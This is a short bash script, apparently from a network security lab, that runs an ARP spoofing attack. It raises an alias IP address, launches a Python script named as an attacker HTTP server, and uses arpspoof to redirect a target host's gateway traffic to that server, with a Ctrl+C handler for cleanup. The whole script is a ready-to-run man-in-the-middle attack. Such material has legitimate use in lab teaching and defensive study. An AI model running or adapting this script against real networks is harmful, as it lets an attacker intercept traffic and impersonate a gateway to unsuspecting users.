#!/bin/bash


terminate_python_script() {
    echo ""
    echo "Webserver stopped..."
    kill -s SIGTERM "$python_pid"
    echo "Remove alias..."
    ifconfig h2-eth0:0 10.0.10.11 down
}

echo "We spoof the gateway and and an alias address"
ifconfig h2-eth0:0 10.0.10.11 up

python3 startHTTPD-Attacker.py &
python_pid=$!



echo "Spoofing....."
arpspoof -i h2-eth0  -t 10.0.20.11 10.0.20.1
trap 'terminate_python_script' SIGINT
echo "Please stop by strg+c...."
wait "$python_pid"
